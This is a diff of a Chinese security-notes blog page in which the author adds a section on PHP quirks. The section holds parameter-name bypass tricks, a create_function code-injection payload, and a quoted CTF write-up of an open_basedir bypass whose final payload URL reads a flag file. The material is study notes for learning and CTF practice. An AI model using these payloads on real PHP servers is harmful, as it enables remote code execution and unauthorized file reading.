@@ -272,7 +272,7 @@ height:45vh;
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">1.1k</span>阅读时长: <span class="post-count reading-time">4 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.3k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -439,7 +439,15 @@ height:45vh;
 <blockquote>
 <p><a href="http://blkstone.github.io/2017/11/09/updatexml-sqli/" target="_blank" rel="noopener">http://blkstone.github.io/2017/11/09/updatexml-sqli/</a></p>
 </blockquote>
-
+<h1 id="php的一些特性"><a href="#php的一些特性" class="headerlink" title="php的一些特性"></a>php的一些特性</h1><p>当代码中存在<code>\$_REQUEST[&#39;user_id&#39;]</code> <strong>/?user.id</strong>传参去进行绕过,同样可以绕过的符号还有<code></code>、<code>.</code>、<code>[</code>、<code>+</code>、<code>_</code></p>
+<blockquote>
+<p>详见：<a href="https://shuimugan.com/bug/view?bug_no=64792" target="_blank" rel="noopener">https://shuimugan.com/bug/view?bug_no=64792</a></p>
+</blockquote>
+<p>全局空间：<code>&lt;?= namespace c;\eval(phpinfo());?&gt;</code><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>=create_function($_GET[<span class="number">1</span>],<span class="number">1</span>);<span class="meta">?&gt;</span></span><br><span class="line">/?<span class="number">1</span>=)&#123;&#125;phpinfo();<span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p><a href="https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/" target="_blank" rel="noopener">https://mochazz.github.io/2019/01/12/create_function%E5%87%BD%E6%95%B0%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0RCE/</a></p>
+</blockquote>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Main points : </span><br><span class="line">	- open_basedir is a INI_ALL directive, and is consequently manageable through ini_set() <span class="keyword">function</span>, but only to make the rule more strict (the new path is checked against open_basedir)</span><br><span class="line">	- open_basedir can be stored as a non resolved relative path</span><br><span class="line"></span><br><span class="line">Solution :</span><br><span class="line">	- Go into the <span class="string">'img'</span> dir with <span class="built_in">chdir</span>() <span class="keyword">function</span></span><br><span class="line">	- Set the open_basedir restriction to <span class="string">'..'</span> with ini_set(). This will be accepted as it points to /var/www/html, <span class="built_in">which</span> is authorized against the current open_basedir restriction.</span><br><span class="line">	- The value stored <span class="keyword">in</span> the open_basedir is not resolved; <span class="string">'..'</span> is stored as the new open_basedir restriction. You can <span class="built_in">chdir</span>(<span class="string">'..'</span>); multiple <span class="built_in">times</span> to go at the root folder.</span><br><span class="line">	- You can now reset the open_basedir restriction to /, that completely cancels it.</span><br><span class="line">	- ... and <span class="built_in">read</span> the flag!</span><br><span class="line"></span><br><span class="line">Final payload : </span><br><span class="line">	http://91.121.31.50/phuck3/?<span class="built_in">eval</span>=<span class="built_in">chdir</span>(<span class="string">'img'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);<span class="built_in">chdir</span>(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);<span class="built_in">echo</span>(file_get_contents(<span class="string">'flag'</span>));</span><br></pre></td></tr></table></figure>
     </article>
     <!-- license  -->
     
@@ -447,7 +455,7 @@ height:45vh;
             <p>原文作者：<a href="http://Vorders.me">Vorder</a>
             <p>原文链接：<a href="http://Vorders.me/2018/11/06/琐碎知识/">http://Vorders.me/2018/11/06/琐碎知识/</a>
             <p>发表日期：<a href="http://Vorders.me/2018/11/06/琐碎知识/">November 6th 2018, 5:20:09 pm</a>
-            <p>更新日期：<a href="http://Vorders.me/2018/11/06/琐碎知识/">March 4th 2019, 2:04:32 pm</a>
+            <p>更新日期：<a href="http://Vorders.me/2018/11/06/琐碎知识/">April 19th 2019, 10:17:59 am</a>
             <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -577,7 +585,7 @@ top:45vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell"><span class="toc-number">1.</span> <span class="toc-text">webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#代码执行方法"><span class="toc-number">1.1.</span> <span class="toc-text">代码执行方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval-hook检测"><span class="toc-number">1.2.</span> <span class="toc-text">eval hook检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含"><span class="toc-number">2.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#重定向跳转"><span class="toc-number">3.</span> <span class="toc-text">重定向跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#url语法结构"><span class="toc-number">3.1.</span> <span class="toc-text">url语法结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#误导向url跳转"><span class="toc-number">3.2.</span> <span class="toc-text">误导向url跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-混淆"><span class="toc-number">3.2.1.</span> <span class="toc-text">1.混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-其他操作"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.其他操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-unicode不可见字符钓鱼"><span class="toc-number">3.2.3.</span> <span class="toc-text">3.unicode不可见字符钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-针对unicode大小写转换后的攻击"><span class="toc-number">3.2.4.</span> <span class="toc-text">4.针对unicode大小写转换后的攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL-Scheme-Attack"><span class="toc-number">3.3.</span> <span class="toc-text">URL Scheme Attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql错误型注入"><span class="toc-number">4.</span> <span class="toc-text">mysql错误型注入</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell"><span class="toc-number">1.</span> <span class="toc-text">webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#代码执行方法"><span class="toc-number">1.1.</span> <span class="toc-text">代码执行方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#eval-hook检测"><span class="toc-number">1.2.</span> <span class="toc-text">eval hook检测</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#文件包含"><span class="toc-number">2.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#重定向跳转"><span class="toc-number">3.</span> <span class="toc-text">重定向跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#url语法结构"><span class="toc-number">3.1.</span> <span class="toc-text">url语法结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#误导向url跳转"><span class="toc-number">3.2.</span> <span class="toc-text">误导向url跳转</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-混淆"><span class="toc-number">3.2.1.</span> <span class="toc-text">1.混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-其他操作"><span class="toc-number">3.2.2.</span> <span class="toc-text">2.其他操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-unicode不可见字符钓鱼"><span class="toc-number">3.2.3.</span> <span class="toc-text">3.unicode不可见字符钓鱼</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-针对unicode大小写转换后的攻击"><span class="toc-number">3.2.4.</span> <span class="toc-text">4.针对unicode大小写转换后的攻击</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#URL-Scheme-Attack"><span class="toc-number">3.3.</span> <span class="toc-text">URL Scheme Attack</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql错误型注入"><span class="toc-number">4.</span> <span class="toc-text">mysql错误型注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php的一些特性"><span class="toc-number">5.</span> <span class="toc-text">php的一些特性</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -590,6 +598,8 @@ top:45vh;
     <div class="sidebar-content sidebar-content-show-archive">
           <div class="sidebar-panel-archives">
     <!-- 在ejs中将archive按照时间排序 -->
+    
+    
     
     
     
@@ -738,15 +748,15 @@ top:45vh;
     
         <span class="sidebar-tag-name" data-tags="vulub"><span class="iconfont-archer">&#xe606;</span>vulub</span>
     
+        <span class="sidebar-tag-name" data-tags="ELK"><span class="iconfont-archer">&#xe606;</span>ELK</span>
+    
         <span class="sidebar-tag-name" data-tags="知识积累"><span class="iconfont-archer">&#xe606;</span>知识积累</span>
     
-        <span class="sidebar-tag-name" data-tags="ELK"><span class="iconfont-archer">&#xe606;</span>ELK</span>
+        <span class="sidebar-tag-name" data-tags="信息搜集"><span class="iconfont-archer">&#xe606;</span>信息搜集</span>
     
         <span class="sidebar-tag-name" data-tags="sem-cms"><span class="iconfont-archer">&#xe606;</span>sem-cms</span>
     
         <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
-    
-        <span class="sidebar-tag-name" data-tags="信息搜集"><span class="iconfont-archer">&#xe606;</span>信息搜集</span>
     
         <span class="sidebar-tag-name" data-tags="索引"><span class="iconfont-archer">&#xe606;</span>索引</span>
     
